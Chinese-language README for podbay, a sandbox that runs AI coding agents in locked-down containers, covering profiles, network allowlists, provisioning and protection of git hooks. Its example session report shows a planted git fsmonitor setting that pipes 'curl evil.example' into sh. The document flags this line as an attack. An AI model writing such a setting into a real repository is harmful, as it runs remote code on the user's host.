<a id="podbay"></a>
# Podbay

[English](README.md) · **简体中文**

<!-- source: README.md sha256:f34f9caaad75598b2be7107d32dddbbbc8849af89509352f7a1a80f5618204cb -->

> 本文译自 [README.md](README.md)。两者不一致时以英文版为准。podbay 的命令输出是英文的，
> 下面的代码块与英文版逐字相同，便于你对照终端里看到的内容。中国大陆的网络环境另见
> [中国大陆用户须知](#zh-cn-notes)。

一次性容器，用来在代码库里工作，包括运行 AI 编程助手和你并不完全信任的代码，而不必把整台机器交给它们。

`podbay run` 会围绕一个项目目录启动一个用完即弃的容器。项目以读写方式挂载在
`/home/dev/workspace/repomount`，除此之外的一切都是你声明过的：

- 只读挂载的 dotfiles，包括你的 shell 配置
- 命名卷（volume），保存需要比容器活得更久的状态
- 你自己的工具链管理器（rustup、uv、nvm、nix、mise 等），由 profile 调用，像平时一样安装到卷里
- 你想要的 shell、环境变量和 PATH 条目
- 你喜欢的镜像，比如 `alpine`、`ubuntu` 或某个编程助手自己的镜像，原样使用；也可以用 podbay 自带的小型 Debian 基础镜像
- 可选的、以 root 身份运行并固化进派生镜像的构建脚本
- 网络访问：无网络、只允许通过 HTTPS 访问你列出的主机，或完全放开
- 你转发的端口，让宿主机能访问会话里的服务

这些都写在 profile 里：放在你配置目录中的小 TOML 文件，每次运行时可以叠加，比如一个管语言、一个管编程助手。podbay
从不读取挂载进来的项目，所以项目无法自己选择工具、挂载、网络，也无法选择任何需要 root 的东西。

<a id="status"></a>
## 状态

已可在 Linux 上日常使用，配合 rootless Podman（推荐）或 Docker；每次改动都会在 CI 中测试这两者。macOS 未经测试。podbay
尚未到 1.0：profile 格式仍可能变化，而且目前还没有预编译的二进制文件，需要从源码构建（见下文）。

已完成的部分，按[威胁模型](THREAT_MODEL.zh-CN.md)所引用的阶段排列：

1. **用 Rust 重写**，包含 Podman 和 Docker 后端、测试和 CI。*（已完成）*
2. **会话报告**：每次会话结束后标出 git 钩子和配置的改动。*（已完成）*
3. **容器加固**：不保留任何 capability、`no-new-privileges`、只读根文件系统、进程数限制。*（已完成）*
4. **网络策略**：默认无网络；通过过滤代理只允许 HTTPS 访问列出的主机；工具安装放在单独的预置（provisioning）步骤里。*（已完成）*
5. **内核与文件访问**：每个容器都使用 podbay 自己的 seccomp 过滤器，git 钩子和配置只读，并可用 `writable`
   让项目的其余部分保持只读 *（已完成）*。不打算引入 Landlock：在 podbay 的容器里，它与只读根文件系统和网络命名空间重复，而且无法把单个文件设为只读。
6. 原生的 rootless 运行时，Podman 和 Docker 保留作为后备。

另外还有：可叠加的 profile、任意容器镜像、端口转发、只传给会话的 API 密钥，以及一个小而固定版本的依赖集（八个 crate，每个都列出并在 CI 中检查）。

项目是以读写方式挂载的，所以会话留在项目里的东西是回到你宿主机的主要途径。宿主机上的 git 会运行的钩子和配置，在会话中是[只读的](#git-hooks-and-config)；其余的，比如你之后会自己运行的
`Makefile`，[会话报告](#session-report)会告诉你改了什么。[THREAT_MODEL.zh-CN.md](THREAT_MODEL.zh-CN.md)
说明了哪些受保护、哪些不受保护，以及每个缺口由哪个阶段弥补。

<a id="install"></a>
## 安装

发布版提供 x86_64 和 arm64 的静态 Linux 二进制文件，附带校验和以及签名的构建来源证明（provenance）。以 x86_64
为例（arm64 请用 `aarch64`，版本号请用发布页上的最新版本）：

```
v=v0.1.0 t=x86_64-unknown-linux-musl
curl -fsSLO "https://github.com/supercowmoo/podbay/releases/download/$v/podbay-$v-$t"
curl -fsSLO "https://github.com/supercowmoo/podbay/releases/download/$v/SHA256SUMS"
sha256sum --ignore-missing -c SHA256SUMS
gh attestation verify "podbay-$v-$t" --repo supercowmoo/podbay
install -m 0755 "podbay-$v-$t" ~/.local/bin/podbay
```

校验和说明下载的文件完整无损。用 GitHub CLI 检查的证明（attestation）说明该二进制文件是由本仓库的发布工作流从打了标签的提交构建出来的，而不是有人手动上传的。

也可以自己构建：

```
cargo install --locked --path .
```

`--locked` 会使用 `Cargo.lock` 中记录的确切依赖版本和校验和来构建。不加它，cargo 会选用更新的版本。编译器版本也是固定的（`rust-toolchain.toml`），需要时
rustup 会自动安装。

你需要 Podman 或 Docker。两者都装了时优先使用 Podman，因为它默认就是 rootless 的。使用 rootful Docker
时，一旦发生容器逃逸，攻击者在宿主机上就是 root，podbay 每次运行都会提醒这一点。

然后检查这台机器：

```
podbay doctor
```

它会检查容器引擎以及是否 rootless、能施加哪些资源限制、rootless Podman 需要的东西（subuid 和 subgid 范围、用户命名空间、`/dev/net/tun`）、seccomp、podbay
套接字所用的运行时目录，以及 `config.toml` 和每个 profile 能否加载。每个问题都会附上该改什么；如果会话无法运行，它以非零状态退出。

<a id="quick-start"></a>
## 快速上手

```
podbay run ~/src/some-project
```

第一次运行会构建自带的基础镜像：Debian slim，带 git、curl、build-essential 和 bash。没有语言工具链，也没有编程助手：这些由
profile 提供。其他任何镜像也都可以用，见[镜像](#images)。除非你给它网络，否则会话没有网络。

<a id="your-first-profiles"></a>
### 你的第一批 profile

profile 是 `~/.config/podbay/profiles/` 下的 TOML 文件，每个 profile 一个文件，以它的名字命名（见
[podbay 在哪里查找](#where-profiles-live)）。下面是一个 Rust profile 和一个编程助手 profile，分开写，以后可以各自替换。

语言 profile 调用 rustup，就像你在自己机器上做的那样：一个固定的版本，并核对官方公布的校验和。之后 rustup
会按项目的 `rust-toolchain.toml` 安装所需的工具链，装进一个比容器活得更久的卷里。（它就是
[`examples/profiles/rust.toml`](examples/profiles/rust.toml)，去掉了允许会话访问 crates.io 的那几行。）

```toml
# ~/.config/podbay/profiles/rust.toml
path = ["/home/dev/.cargo/bin"]

[env]
RUSTUP_HOME = "/home/dev/.rustup"
CARGO_HOME = "/home/dev/.cargo"

[[volume]]
name = "rustup"
container = "/home/dev/.rustup"
provision = true

[[volume]]
name = "cargo"
container = "/home/dev/.cargo"
provision = true

[provision]
command = """
rustup=1.29.2
case "$(uname -m)" in
  x86_64) target=x86_64-unknown-linux-gnu sum=5be191e8c70a5007074254cb74d78dbfdd25cd5a61c27de7b8e5410122ec24f4 ;;
  aarch64) target=aarch64-unknown-linux-gnu sum=a9c168dbea81a84671c6b7a5c1795cb0eb699020110d107ddfca427bd797e697 ;;
  *) echo "no rustup build for $(uname -m)" >&2; exit 1 ;;
esac
if ! command -v rustup >/dev/null; then
  curl -fsSL -o /tmp/rustup-init "https://static.rust-lang.org/rustup/archive/$rustup/$target/rustup-init"
  echo "$sum  /tmp/rustup-init" | sha256sum -c -
  chmod +x /tmp/rustup-init
  /tmp/rustup-init -y --no-modify-path
fi
rustup show active-toolchain || rustup toolchain install
if [ -f Cargo.lock ]; then cargo fetch --locked; fi
"""
watch = ["rust-toolchain.toml", "rust-toolchain", "Cargo.lock"]
```

助手 profile 安装一个终端编程助手（这里用 opencode），并让会话只能访问它的 API：

```toml
# ~/.config/podbay/profiles/opencode.toml
network = ["api.anthropic.com"]   # its model provider, and nothing else
path = ["/home/dev/.opencode/bin"]

# Its login, settings and history, kept between sessions.
[[volume]]
name = "config"
container = "/home/dev/.config/opencode"

[[volume]]
name = "data"
container = "/home/dev/.local/share/opencode"

# The agent itself.
[[volume]]
name = "bin"
container = "/home/dev/.opencode"
provision = true

[provision]
command = "test -x ~/.opencode/bin/opencode || curl -fsSL https://opencode.ai/v2/install | bash"
```

把它们叠加起来并启动助手：

```
podbay run -p rust -p opencode ~/src/my-rust-app -- opencode
```

会话开始前，podbay 会在一个有网络的单独容器里运行这两个 `[provision]` 命令（见[预置](#provisioning)）。会话本身只能访问
profile 列出的主机。

以后要切换只需改一个词，前提是有一个同样写法的 `python.toml` 或 `claude.toml`：

```
podbay run -p python -p opencode ~/src/scraper    # same agent, another language
podbay run -p rust -p claude ~/src/my-rust-app    # same language, another agent
```

助手在这两种组合下都保留登录状态和历史记录，因为卷属于声明它的 profile（`podbay-opencode-config`），而不属于某个组合。

[`examples/`](examples/) 里有可以直接复制的 profile：`rust.toml`，以及用于
[DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) 的 `dsh.toml`，模型来自
OpenRouter，它的网页界面会转发到你的浏览器：

```
cp examples/profiles/*.toml ~/.config/podbay/profiles/
mkdir -p ~/.config/podbay/dsh && cp examples/dsh/cordis.patch.yml ~/.config/podbay/dsh/
export OPENROUTER_API_KEY=...
podbay run -p rust -p dsh ~/src/my-rust-app -- dsh web --no-open
```

然后打开 dsh 打印出来的 URL，里面带有登录令牌。

<a id="basic-commands"></a>
### 基本命令

```
podbay run . -- make test     # run a command instead of a shell
podbay run --dry-run .        # print the exact podman/docker command
podbay run --online .         # give this session the network
podbay run --offline .        # or take it away, whatever the config says
podbay run --port 3080 .      # reach a server in the session on 127.0.0.1:3080
podbay build                  # build any missing images ahead of time
podbay build --force          # rebuild them all with current packages
podbay provision .            # run the profiles' [provision] commands now
podbay doctor                 # check this machine, config and profiles
podbay clean                  # remove old images and leftover containers
```

podbay 的退出码就是命令（或 shell）的退出码。

容器在项目里创建的文件，在宿主机上归你所有。在 rootless Podman 上，`dev` 通过 `keep-id` 映射到你的用户。在 rootful
Docker 上，`dev` 会在 podbay 添加到每个镜像的用户文件里获得你的 uid 和 gid（见[镜像](#images)）。

<a id="profiles"></a>
## Profile

一个 profile 就是一个 TOML 文件，说明会话能得到什么：挂载、卷、环境变量、网络、端口、要安装的工具。一切都由某个 profile
决定；不带任何 profile 运行时，得到的就是裸镜像。

<a id="where-profiles-live"></a>
### profile 放在哪里

```
~/.config/podbay/
  config.toml           # optional settings, see Configuration
  profiles/
    base.toml           # your dotfiles: git and shell config
    rust.toml           # one per language you work in
    python.toml
    opencode.toml       # one per coding agent
    claude.toml
```

设置了 `XDG_CONFIG_HOME` 时是 `$XDG_CONFIG_HOME/podbay`，设置了 `PODBAY_CONFIG_DIR` 时是
`$PODBAY_CONFIG_DIR`。文件名就是 profile 名（小写字母、数字、`-` 和 `_`）。上面的布局只是建议：每个关注点一个 profile
叠加起来很方便，但把所有东西放进一个 profile 也完全可以。

<a id="stacking"></a>
### 叠加

一起给出的 profile 按顺序累加：

```
podbay run -p base -p rust -p opencode .
podbay run -p base,rust,opencode .            # the same
```

这与一个写了 `extends = ["base", "rust", "opencode"]` 的 profile 完全相同：卷、挂载、预置命令、`path`、网络主机和端口全部合并；被两者都继承的
profile 只应用一次；后面 profile 的 `[env]` 键、`shell`，或同一容器路径上的挂载，会替换前面的。当两个叠加的 profile
对同一项设置了不同的值时，podbay 会说明哪一个生效：

```
podbay: note: shell from base is replaced by opencode's
```

profile 替换它所 `extends` 的内容是预期行为，不会提示。

不带 `-p` 时，podbay 依次使用：`config.toml` 中为该项目目录列出的 profile，否则是 `default_profile`，否则是名为
`default` 的 profile（如果存在）：

```toml
default_profile = ["base", "opencode"]

[projects]                            # the deepest listed directory wins
"~/src/my-rust-app" = ["base", "rust", "opencode"]
"~/src/scraper" = ["base", "python", "opencode"]
"~/work" = "work"
```

这样 `podbay run ~/src/my-rust-app` 会选中它自己的组合，而 `-p` 仍可在某一次运行中覆盖它。这些都写在你的配置里，绝不在项目里：项目不能选择自己的
profile，因为 profile 决定了它的网络、挂载和 capability。

<a id="commands"></a>
### 命令

```
podbay profile init base              # a new profile from a commented template
podbay profile init rust --extends base
podbay profile list
podbay profile show rust opencode     # what stacking them resolves to
```

<a id="reference"></a>
### 参考

```toml
# ~/.config/podbay/profiles/base.toml

# Bind mounts from the host, read-only unless mode = "rw".
[[mount]]
host = "~/.gitconfig"
container = "/home/dev/.gitconfig"

[[mount]]
host = "~/.bashrc"
container = "/home/dev/.bashrc"
```

```toml
# ~/.config/podbay/profiles/zsh.toml: for zsh users. bash is the default.
extends = ["base"]
extension = "zsh.sh"       # apt-get install -y zsh
shell = "zsh"              # started as a login shell when no command is given

[[mount]]
host = "~/.zshrc"
container = "/home/dev/.zshrc"
```

```toml
# ~/.config/podbay/profiles/debug.toml
extends = ["base"]

# Capabilities the session keeps (none by default). podbay prints them on
# every run that uses this profile. SYS_PTRACE also lets ptrace through
# the seccomp filter.
cap_add = ["SYS_PTRACE"]   # gdb, strace

# Syscalls the seccomp filter blocks that this profile needs. podbay
# prints them on every run. engine_default = true uses the engine's own
# filter instead, which on Podman is much looser.
[seccomp]
allow = ["io_uring_setup", "io_uring_enter", "io_uring_register"]

# Override the limits from config.toml.
[limits]
memory = "16g"
```

使用 `extends` 以及叠加 profile 时，靠前的先应用。后面 profile 的挂载或卷会替换继承来的、位于同一容器路径的那个；`[env]`
键和 `shell` 覆盖继承来的值；它的 `path` 条目放在继承来的条目前面。`[provision]` 命令和 `watch` 列表、`cap_add`
以及 `[seccomp] allow` 列表会合并；`engine_default` 一直继承，直到某个 profile 设置它。`[limits]` 的键逐个覆盖；`network`
的主机列表累加，而 `"none"` 或 `"full"` 会替换之前的值。`ports` 列表也累加，`image` 只能选定一个。卷保留声明它的 profile
的名字，所以每个继承 `base` 的 profile 都共享 `base` 的卷。

**API 密钥及其他机密**按名字从你自己的环境中获取：

```toml
# ~/.config/podbay/profiles/openrouter.toml
env_from_host = ["OPENROUTER_API_KEY"]
network = ["openrouter.ai"]
```

```
export OPENROUTER_API_KEY=...       # or however you load it: a password manager, direnv
podbay run -p rust -p openrouter .
podbay: passing OPENROUTER_API_KEY from your environment to the session
```

只有会话能拿到它们，运行安装程序且有网络的预置容器永远拿不到。podbay 只把变量名交给引擎，由引擎自己读取值，所以值不会出现在
podbay 的输出、`--dry-run` 或进程列表里，podbay 也不会把它写到任何地方。未设置的名字会收到一条警告并被略过。叠加的 profile
之间这些列表会累加；同一个名字不能同时出现在 `[env]` 里。会话中的任何东西都能读到这个密钥，并把它发往会话能访问的任何主机，所以请搭配一个只包含该服务商的网络允许列表。

写在 `[env]` 里的密钥也能用，但它们就躺在 profile 文件里，而且 `[env]` 也会进入预置容器。

**用挂载还是卷？** 你在宿主机上拥有并编辑的文件（比如 shell 和 git 配置）用挂载。容器创建或写入的目录（比如工具链）用卷，因为每次会话后
home 目录都会被清空。凡是你的宿主机会运行的东西，挂载时都保持只读：一个可读写的 `~/.bashrc` 或 `~/.cargo`
会让会话植入在你宿主机上运行的代码。引擎会以 root 身份创建缺失挂载点的父目录，podbay-init 会把它们交给 `dev`。

**扩展（extension）** 以派生镜像的形式分层（`podbay-<profile>:<hash>`）。每个标签是脚本及其父镜像标签的哈希，所以修改一个脚本，或链条中它下面的任何脚本，只会重建改动的部分。脚本下载的内容不计入哈希，以同一标签重新构建的自定义基础镜像也不计入：运行
`podbay build --force` 来更新它们。扩展在构建时以 root 身份运行，这是根文件系统唯一可写的时候。它们放进 `/home/dev`
的任何东西都会自动复制到 home 骨架中。

<a id="images"></a>
## 镜像

会话默认从 podbay 自带的基础镜像启动，除非某个 profile 或 `config.toml` 中的 `base_image` 指定了别的镜像。任何镜像都可以原样使用，无论来自镜像仓库还是本地构建：

```toml
# ~/.config/podbay/profiles/alpine.toml
image = "alpine:3.22"
```

```toml
# ~/.config/podbay/profiles/claude-image.toml: Docker's Claude Code image
image = "sbx/claude-image:latest"
network = ["api.anthropic.com"]

[env]
DISABLE_AUTOUPDATER = "1"   # the image is read-only in a session

[[volume]]                   # login and settings, kept between sessions
name = "claude"
container = "/home/dev/.claude"
```

如果镜像不存在，podbay 会拉取它，并在其上构建一个小层（`podbay-image:<hash>`），加入：

- podbay-init：一个静态二进制文件，负责设置会话并降权到 `dev` 用户。它是容器的第一个进程。
- 镜像自己的 `/etc/passwd` 和 `/etc/group` 中的 `dev` 用户和组，使用会话运行时的 id。如果镜像已有使用该 uid 的用户（比如
  uid 为 1000 的 `agent` 或 `ubuntu`），`dev` 与它共用，镜像里的文件仍然可读。
- 让登录 shell 保留 profile 中 `path` 的那段脚本。

做这些不需要在镜像里运行任何东西，所以没有 shell 或包管理器的镜像也能用（distroless、`scratch`）。镜像自己的 `ENTRYPOINT`
和 `CMD` 仍是默认命令：`podbay run -p claude-image .` 会启动 Claude Code，`--` 则运行别的命令。镜像的环境变量（比如
`PATH`）会保留。它的 `USER` 不会：每个会话都以 `dev` 身份运行，home 为 `/home/dev`，因此 profile 在任何镜像上都能用。

在任何镜像上，会话都与在自带镜像上一样被锁定：没有 capability、`no-new-privileges`（所以镜像里的 `sudo`
无效）、只读根文件系统、podbay 的 seccomp 过滤器和网络策略。Docker-in-Docker 以及某些镜像期望从自己的沙箱获得的功能都不可用。

标签可以被移到不同的内容上；要精确固定运行的内容，请加上摘要（digest），就像 podbay 对自己的镜像所做的那样：
`image = "alpine:3.22@sha256:2e0b81d6…"`（可从 `docker buildx imagetools inspect` 或 `skopeo inspect` 获得）。

一组叠加的 profile 只有一个镜像。两个叠加的 profile 指定不同镜像会报错，除非其中一个继承另一个。扩展构建在选定的镜像之上，所以镜像里需要有
shell；预置命令需要它们调用的工具（Alpine 有 `wget`，没有 `curl`）。使用某个镜像就意味着信任它的发布者。podbay
不会自动跟随标签更新到新版本：`podbay build --force` 会重新拉取镜像。

镜像、扩展或 podbay 本身的每次改动都会留下旧镜像。`podbay clean` 会删除它们（当前 podbay 使用的自带基础镜像和中继镜像除外），连同被杀掉的 podbay
留下的中继容器和缓存的 seccomp 过滤器；删掉的东西在需要时会重建。`--dry-run` 显示它将做什么。它从不删除卷（卷里保存着登录状态、历史记录和已安装的工具），而是把它们列出来。

<a id="what-a-session-can-do"></a>
## 会话能做什么

- **写入**：项目、卷、可读写挂载，以及三个临时区域：`/home/dev`、`/tmp` 和 `/var/tmp`。文件系统的其余部分是只读的。home
  目录每次会话都是新的 tmpfs，启动时从镜像复制。值得保留的东西应放在项目或卷里。
- **特权**：没有。会话以 `dev` 身份运行，没有任何 capability，并启用 `no-new-privileges`，所以 setuid 程序和 `sudo`
  都不起作用。容器的第一个进程 podbay-init 启动时只拥有设置 home 目录和修正挂载属主所需的最小权限，并在你的命令运行前全部放弃。profile
  可以用 `cap_add` 保留特定的 capability（见下文）。
- **系统调用**：podbay 的 seccomp 过滤器，Podman 和 Docker 上相同。它是 Docker 的默认 profile，另外还阻止了 `ptrace`
  以及读写其他进程的内存，所以会话无法创建命名空间、挂载文件系统、使用 io_uring、BPF 或密钥环，也无法跟踪进程。Podman
  自己的默认设置允许命名空间、挂载、密钥环和 `ptrace`。profile 可以重新放开特定的调用（见下文），`cap_add` 也会像在 Docker
  中一样带回与该 capability 相关的调用。
- **Git**：提交、分支等操作照常工作，但项目的 git 钩子和配置是只读的；见 [Git 钩子与配置](#git-hooks-and-config)。
- **网络**：没有。会话只有一个回环接口，所以无法访问互联网、你的局域网或宿主机。profile 可以允许通过 HTTPS 访问特定主机（见[网络允许列表](#network-allowlist)），或用
  `network = "full"` 打开完全访问。如果你大多在线工作，可以在 `config.toml` 中这样设置，不想联网时用 `--offline`；podbay
  每次运行都会说明这项设置。当是某个 profile 打开了完全访问时，podbay 会打印一条警告，因为这很容易被忽略。安装工具两者都不需要；见[预置](#provisioning)。
- **入站连接**：没有，除非你[转发端口](#forwarded-ports)。那时宿主机只能从它自己的 `127.0.0.1` 访问那一个端口。
- **资源**：默认最多 4096 个进程和线程。内存和 CPU 限制需要主动开启。rootless 引擎只有在 systemd 把对应的 cgroup
  控制器委派给你的用户时才能施加限制。否则 podbay 会警告，并在没有该限制的情况下运行。

<a id="network-allowlist"></a>
## 网络允许列表

profile 可以让会话通过 HTTPS 访问少数几个主机，别的都不行：

```toml
network = ["api.anthropic.com", "*.githubusercontent.com", "registry.example.com:8443"]
```

`*.example.com` 覆盖 `example.com` 下的所有名字（不含 `example.com` 本身），不写端口时为 443。profile
中的列表会加到它所继承的 profile 的列表上；`"none"` 或 `"full"` 会替换它们。`--offline` 和 `--online`（或
`--network none|full`）在单次运行中覆盖一切。

会话除了回环之外仍然没有网络接口。podbay 在它旁边启动一个很小的中继容器，同样没有网络，会话共享中继的网络命名空间。中继在
`127.0.0.1:3128` 上监听，把每个连接交给宿主机上的 podbay，后者：

- 只接受 HTTPS 代理请求（`CONNECT host:port`），且只针对列表上的名字。IP 地址会被拒绝，不在列表上的名字永远不会被解析，所以会话无法通过 DNS 泄露数据。
- 拒绝解析到回环、私有、链路本地（包括 169.254.169.254 上的云元数据服务）或其他非公网地址的名字。局域网上的镜像仓库无法通过这种方式放行。
- 从宿主机发起连接，双向复制字节。TLS 在会话和服务器之间端到端加密；podbay 只看到主机名。

会话会得到指向中继的 `HTTPS_PROXY` 和 `HTTP_PROXY`（以及小写形式），以及给 Node 用的 `NODE_USE_ENV_PROXY=1`。大多数工具，包括
curl、通过 HTTPS 的 git、npm、pip 和 cargo，都会使用这些变量。Node 本身从 24.5 和 22.21 开始遵循它们（仅 `fetch` 从
24.0 开始）；在更早的版本上，脚本自己发出的 HTTPS 请求会像域名无法解析一样失败。忽略这些变量或使用其他协议（比如 SSH）的程序完全无法建立连接。纯
`http://` 的 URL 会被拒绝。

会话结束后，podbay 会列出它被请求过的每个目标：

```
podbay: network:
  api.anthropic.com:443: allowed (14 times)
  pastebin.com:443: denied, not on the allowlist
```

中继镜像在第一次需要时从源码构建，基于一个固定版本的 Rust 镜像，大小不到 1 MB。

<a id="forwarded-ports"></a>
## 端口转发

会话中运行的网页界面、开发服务器或文档预览可以让宿主机访问：

```toml
ports = [3080]             # host 127.0.0.1:3080 -> session port 3080
ports = ["8080:3000"]      # host 127.0.0.1:8080 -> session port 3000
```

```
podbay run --port 3080 .
podbay run --port 8080:3000 .
podbay: forwarding http://127.0.0.1:8080 to session port 3000
```

列表在 `extends` 和 `--port` 之间累加；把一个宿主机端口转发到两个会话端口会报错。宿主机端口已被占用时，运行会在任何东西启动之前失败。

服务器只需监听会话的回环地址（`127.0.0.1` 或 `::1`），这是大多数开发服务器的默认设置。podbay 在宿主机的 `127.0.0.1`
上监听，从不在其他地址上监听，所以转发不会把会话暴露给你的局域网。它在任何网络设置下都能工作：会话共享中继容器的网络命名空间，中继把
podbay 交给它的每个连接接到那个端口上。会话无法通过转发打开任何东西。会话结束后，podbay 会统计连接数：

```
podbay: forwarded ports:
  127.0.0.1:8080 -> session port 3000: 12 connections
```

转发放进来的不只是你。你机器上的任何东西都能连接它，包括浏览器里打开的网页，所以一个会根据请求执行操作的服务器（比如会运行命令的编程助手网页界面）可能被它们操纵。会话提供的页面还能读写你在
`localhost` 上使用的其他所有网页应用的 cookie，因为浏览器不按端口区分 cookie。只在需要时转发，并为它使用单独的浏览器配置文件。详见
[THREAT_MODEL.zh-CN.md](THREAT_MODEL.zh-CN.md#other-channels-and-the-stage-that-closes-them)。

<a id="provisioning"></a>
## 预置

podbay 不替你选择工具链管理器。profile 指定一个安装工具的命令，以及工具存放的卷：

[快速上手中的 `rust.toml`](#your-first-profiles) 是一个完整的例子：rustup 不存在时安装它，然后让 rustup
安装项目固定的工具链，就和你手动做的完全一样。podbay 从不读取项目来决定安装什么；命令由 profile 指定，工具照它平常的方式工作。

该命令在会话之前，以 `sh -e` 在一个单独的短期容器中运行。这个容器有网络，但只能看到安装所需的东西：只读的项目、标记了
`provision = true` 的卷，以及 profile 的 `[env]` 和 `path`。绑定挂载、其他卷和 capability
都被排除在外，所以保存在那里的凭据永远不会与网络同处一个容器，即使会话本身是离线的。所有 profile（无论叠加还是继承）的命令按顺序运行，靠前的 profile 先运行。

当决定工具的任何东西自上次成功运行后发生变化时，`podbay run` 会自动预置：镜像、命令、预置卷、`[env]`、`path`、`--local-cache`，或
`watch` 中列出的文件。被监视的目录覆盖直接位于其中的文件。预置时 podbay 会打印一行提示。预置失败时会话仍会启动，并给出警告。

要刷新固定为 `latest` 的工具、删除卷之后，或工具来自你没有监视的文件时，自己运行 `podbay provision`。它安装到 `run`
会使用的同一组卷中；传入 `--local-cache` 以对应 `run --local-cache`。

工具链管理器本身可以来自预置命令（如 `rust.toml`），也可以来自固化进镜像的[扩展](#profiles)。mise
只是又一个选择：在扩展里安装它，给 `~/.local/share/mise` 一个卷，再用 `mise install` 作为命令。

<a id="git-hooks-and-config"></a>
## Git 钩子与配置

你宿主机上的 git 下次在那里使用时，会运行项目的钩子，以及项目配置中指定的程序（`core.fsmonitor`、`core.hooksPath`、过滤器、别名）。所以在会话中，`.git/hooks`
和 `.git/config` 是只读的，子模块 git 目录中的相应文件也一样：

```
podbay: git hooks and config are read-only in the session (protect_git)
```

提交、建分支、diff、rebase 以及从已有远程仓库 fetch 都照常工作。会失败的是写 git 配置的操作：`git config`、`git remote
add`、`git checkout --track`（git 会对配置文件报告 “Device or resource busy”）。可以在 `[env]` 中用
`GIT_AUTHOR_NAME` 等变量设置身份，或者挂载一个位于项目之外的 `~/.gitconfig`。在会话中，git 目录本身也无法被重命名或删除，所以无法被换成可写的副本。缺失的
`.git/hooks` 会在会话开始前创建为空目录。

要为某个 profile 允许写入（风险自负）：

```toml
protect_git = false
```

这样 podbay 每次运行都会说明这一点，剩下能告诉你被植入钩子的就只有[会话报告](#session-report)了。

<a id="limiting-where-a-session-writes"></a>
## 限制会话可写的位置

宿主机会执行的文件不只有 git 钩子和配置：`Makefile`、`package.json` 脚本、`.envrc` 或 `.vscode/`
任务会在你之后构建或打开项目时运行。要让会话碰不到它们，列出它可以写入的位置，项目的其余部分就是只读的：

```toml
writable = ["src", "tests", "target"]
```

```
podbay: the project is read-only in the session except src, tests, target
```

缺失的路径会在会话前创建为目录。叠加的 profile 之间列表会累加。路径必须是普通的相对路径，如果某个路径本身是符号链接或经过符号链接，podbay
会拒绝它，因为挂载会跟随链接跑出项目之外。Git 照常工作：开启 [`protect_git`](#git-hooks-and-config) 时，`.git`
除了钩子和配置之外仍然可写。列出的文件可以原地编辑，但不能被替换，所以通过重命名来保存的工具需要列出它所在的目录。

<a id="session-report"></a>
## 会话报告

容器退出时，podbay 会报告它改动过的、宿主机之后会据此行动的东西：git 钩子、git 配置、`.git` 条目本身、嵌套仓库，以及宿主机上编辑器和工具会运行的少数文件（`.envrc`、`.vscode/`、mise
配置）。

```
podbay: session report: 2 warnings, 1 notice
  warning: .git/config: settings changed
            + core.fsmonitor = curl -s evil.example | sh   [can run commands]
  warning: .git/hooks/post-checkout: added, an executable file
  notice:  .envrc: changed during the session (direnv runs it in your shell once allowed)
podbay: git and other tools on the host act on these files. Inspect them before running git in /home/me/src/app
```

干净的会话以一行结束：
`podbay: session report: no changes to git hooks or config`。

出现 warning 意味着：在你查看它列出的文件之前，不要在宿主机上对该项目运行 git。正常工作也可能触发它，比如容器运行了 `git checkout -b x
--track` 并因此写入了分支设置。设置列表让这种情况很容易分辨。报告只检测改动，不会还原它们。[THREAT_MODEL.zh-CN.md](THREAT_MODEL.zh-CN.md)
列出了它覆盖的范围和局限。

<a id="configuration"></a>
## 配置

`~/.config/podbay/config.toml`（所有键都是可选的）：

```toml
backend = "podman"           # or "docker"; default: podman if installed
default_profile = ["base", "rust"]  # or one name; used when -p isn't given
base_image = "alpine:3.22"   # start from any image; profiles' `image` wins
network = "none"             # "full", or a host list; --online/--offline override it

[projects]                   # profiles by project directory; see Stacking
"~/src/app" = ["rust", "dsh"]

[limits]                     # profiles can override each key
pids = 4096                  # processes and threads; 0 for no limit
memory = "8g"                # default: no limit
cpus = 4                     # default: no limit
```

`base_image` 接受任何镜像，与 profile 中的 `image` 一样；见[镜像](#images)。

`PODBAY_CONFIG_DIR` 和 `PODBAY_CACHE_DIR` 可以移动 podbay 的配置和缓存目录，而不影响 `HOME` 或 `XDG_*`。rootless
Podman 用后者来找到它自己的存储。

<a id="shared-toolchains-and-trust"></a>
## 共享工具链与信任

预置卷由使用声明它的 profile 运行的每个项目共享，所以为一个项目安装的工具，下一个项目也能用。安装程序运行时有网络、能看到项目，而且项目通过它被监视的文件选择版本，所以恶意项目可能在共享卷里留下东西，之后被其他项目运行。对于你不信任的代码，`--local-cache`
会给该项目一份自己的预置卷副本（`podbay-<profile>-<name>-<repo-key>`）。

<!-- zh-only -->
<a id="zh-cn-notes"></a>
## 中国大陆用户须知

本节只有中文版才有，补充在中国大陆使用 podbay 时常见的情况。它不改变 podbay 的任何行为。

### 拉取镜像

podbay 自带的基础镜像和中继镜像都从 Docker Hub 拉取（`debian` 和 `rust`）。如果 Docker Hub 访问不畅，请在容器引擎里配置镜像加速器（registry mirror），podbay
不需要任何改动。Podman 写在 `/etc/containers/registries.conf` 或 `~/.config/containers/registries.conf`：

```toml
[[registry]]
prefix = "docker.io"
location = "docker.io"

[[registry.mirror]]
location = "<你的镜像加速器地址>"
```

Docker 写在 `/etc/docker/daemon.json`，然后重启 Docker：

```json
{ "registry-mirrors": ["https://<你的镜像加速器地址>"] }
```

podbay 的这些镜像都按摘要（`@sha256:…`）固定，引擎会核对拉到的内容，所以加速器无法替换成别的镜像。你在 profile 里按标签引用的镜像则不同：加速器给什么就是什么，请像[镜像](#images)一节说的那样加上摘要。

第一次构建基础镜像时，软件包来自 `snapshot.debian.org`，这个站点在哪里都可能比较慢。apt 仍会校验 Debian 的签名；慢只影响第一次构建和 `podbay build --force`。

### 宿主机上的代理

网络允许列表的连接是 podbay 在宿主机上直接发起的：它解析名字，再直连，不使用宿主机上的 `HTTPS_PROXY`。所以：

- 使用 TUN 模式的代理工具时，如果开启了 fake-ip，所有名字都会解析到 `198.18.0.0/15` 这样的保留地址。podbay
  会拒绝这样的地址（它们不是公网地址），会话结束时的网络列表里会显示：

  ```
  podbay: network:
    api.deepseek.com:443: denied, it resolves only to private or local addresses
  ```

  解决办法是在代理工具里把允许列表中的名字排除在 fake-ip 之外（比如 fake-ip 过滤列表），或改用返回真实地址的 DNS 模式。不要为此改用
  `network = "full"`：那会让会话把能读到的东西发往任何地方。
- 只设置了环境变量代理、没有 TUN 的情况下，podbay 的允许列表连接和预置容器都不经过代理。预置容器使用容器引擎的网络，与宿主机上的其他程序一样受系统网络环境影响。

### 工具链镜像源

